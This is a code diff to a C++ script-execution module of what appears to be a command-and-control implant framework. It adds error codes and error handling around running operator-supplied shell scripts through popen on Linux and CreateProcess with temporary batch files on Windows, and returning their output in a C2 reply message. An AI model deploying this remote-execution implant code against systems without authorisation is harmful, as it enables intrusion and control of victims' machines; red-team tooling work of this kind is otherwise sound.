@@ -42,6 +42,14 @@ __attribute__((visibility("default"))) Script * ScriptConstructor()
 
 namespace
 {
+    constexpr int ERROR_SCRIPT_EXECUTION = 1;
+    constexpr int ERROR_UNSUPPORTED_SCRIPT_TYPE = 2;
+    constexpr int ERROR_TEMP_SCRIPT_PATH = 3;
+    constexpr int ERROR_TEMP_SCRIPT_WRITE = 4;
+    constexpr int ERROR_CREATE_PIPE = 5;
+    constexpr int ERROR_SET_HANDLE_INFO = 6;
+    constexpr int ERROR_CREATE_PROCESS = 7;
+
 #ifdef _WIN32
     bool hasWindowsScriptExtension(const std::string& path)
     {
@@ -75,7 +83,7 @@ namespace
         return tempPath.string();
     }
 
-    std::string runWindowsScriptFile(const std::string& scriptPath)
+    std::string runWindowsScriptFile(const std::string& scriptPath, int& errorCode)
     {
         std::string result;
 
@@ -88,12 +96,14 @@ namespace
         HANDLE pipeWrite = nullptr;
         if (!CreatePipe(&pipeRead, &pipeWrite, &securityAttributes, 0))
         {
+            errorCode = ERROR_CREATE_PIPE;
             return "CreatePipe failed.";
         }
         if (!SetHandleInformation(pipeRead, HANDLE_FLAG_INHERIT, 0))
         {
             CloseHandle(pipeRead);
             CloseHandle(pipeWrite);
+            errorCode = ERROR_SET_HANDLE_INFO;
             return "SetHandleInformation failed.";
         }
 
@@ -135,6 +145,7 @@ namespace
         if (!created)
         {
             CloseHandle(pipeRead);
+            errorCode = ERROR_CREATE_PROCESS;
             return "CreateProcess failed.";
         }
 
@@ -221,6 +232,7 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
     const std::string script = c2Message.data();
 
     std::string result;
+    int errorCode = 0;
 
 #ifdef __linux__ 
 
@@ -229,11 +241,15 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(script.c_str(), "r"), pclose);
     if (!pipe)
     {
-        throw std::runtime_error("popen() filed!");
+        result = "popen() failed.";
+        errorCode = ERROR_SCRIPT_EXECUTION;
     }
-    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
+    else
     {
-        result += buffer.data();
+        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
+        {
+            result += buffer.data();
+        }
     }
 
 #elif _WIN32
@@ -241,6 +257,7 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
     if (!hasWindowsScriptExtension(c2Message.inputfile()))
     {
         result = "Unsupported script type on Windows. Use .bat or .cmd.";
+        errorCode = ERROR_UNSUPPORTED_SCRIPT_TYPE;
     }
     else
     {
@@ -248,21 +265,28 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
         if (tempScriptPath.empty())
         {
             result = "Failed to create temporary script path.";
+            errorCode = ERROR_TEMP_SCRIPT_PATH;
         }
         else
         {
             {
                 std::ofstream tempScript(tempScriptPath, std::ios::binary);
                 tempScript.write(script.data(), static_cast<std::streamsize>(script.size()));
+                if (!tempScript.good())
+                {
+                    result = "Failed to write temporary script.";
+                    errorCode = ERROR_TEMP_SCRIPT_WRITE;
+                }
             }
 
-            if (!std::filesystem::exists(tempScriptPath))
+            if (errorCode == 0 && !std::filesystem::exists(tempScriptPath))
             {
                 result = "Failed to write temporary script.";
+                errorCode = ERROR_TEMP_SCRIPT_WRITE;
             }
-            else
+            else if (errorCode == 0)
             {
-                result = runWindowsScriptFile(tempScriptPath);
+                result = runWindowsScriptFile(tempScriptPath, errorCode);
                 std::error_code ignored;
                 std::filesystem::remove(tempScriptPath, ignored);
             }
@@ -272,7 +296,22 @@ int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
 #endif
 
     c2RetMessage.set_instruction(c2Message.instruction());
+    if (errorCode > 0)
+    {
+        c2RetMessage.set_errorCode(errorCode);
+    }
     c2RetMessage.set_returnvalue(result);
 
+    return 0;
+}
+
+int Script::errorCodeToMsg(const C2Message &c2RetMessage, std::string &errorMsg)
+{
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
+    if (c2RetMessage.errorCode() > 0)
+    {
+        errorMsg = c2RetMessage.returnvalue();
+    }
+#endif
     return 0;
 }
